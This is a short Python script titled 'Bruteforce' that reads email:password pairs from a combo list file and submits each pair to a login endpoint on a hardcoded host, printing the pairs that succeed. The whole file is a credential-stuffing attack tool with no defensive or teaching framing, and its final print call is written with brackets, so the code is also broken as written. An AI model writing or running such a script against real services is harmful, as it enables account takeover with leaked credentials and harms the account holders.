# Bruteforce

import requests as r

file = open("combo.txt", encoding="utf8").readlines()

for i in range(len(file)):
    array = file[i].split(":")
    email = array[0]

    password = array[1].replace("\n", "")

    answer = r.post("http://ein32.cloud:1001/", data={"username":email, "password":password})

    if (answer.status_code == 200):
        print[file[i]]
